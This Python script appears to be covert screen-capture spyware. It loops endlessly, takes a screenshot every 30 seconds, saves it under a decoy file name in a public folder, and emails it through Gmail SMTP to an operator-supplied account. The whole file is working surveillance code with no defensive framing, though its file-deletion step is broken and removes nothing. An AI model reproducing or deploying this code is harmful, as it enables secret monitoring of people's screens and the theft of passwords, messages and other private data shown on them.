import pyautogui
import time
import smtplib
import os
import mimetypes
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


path = 'C:/Users/Public/Documents/sounder.png'


def spy():
     scr = pyautogui.screenshot()
     scr.save(path)


def email_sender():
    From = 'admin@example.com'
    To = 'Your Gmail Account'
    msg = MIMEMultipart()
    msg['From'] = From
    msg['To'] = To
    msg['Subject'] = 'Brainiac'
    try:
        smtp = smtplib.SMTP('smtp.gmail.com:587')
        smtp.starttls()
        smtp.login('your gmail account to which you want to receive Screen Shots ', 'Password of that account')
    except:
        i = 1
    else:
        i = 0
    if i == 0:
        c_type, encoding = mimetypes.guess_type(path)
        if c_type is None or encoding is not None:
            c_type = 'application/octet-stream'
        maintype, subtype = c_type.split('/', 1)
        if maintype == 'image':
            fp = open(path, 'rb')
            part = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % path)
        msg.attach(part)

        try:
            smtp.sendmail(From, To, msg.as_string())
        except:
            print("Mail not sent")
        else:
            print("Mail sent")
        smtp.close()
    else:
        print("Connection failed")
    del_pic = path
    path_after_del = os.path.dirname(del_pic)
    print(path_after_del)


start_time = time.time()
while True:
    spy()
    email_sender()
    time.sleep(30)
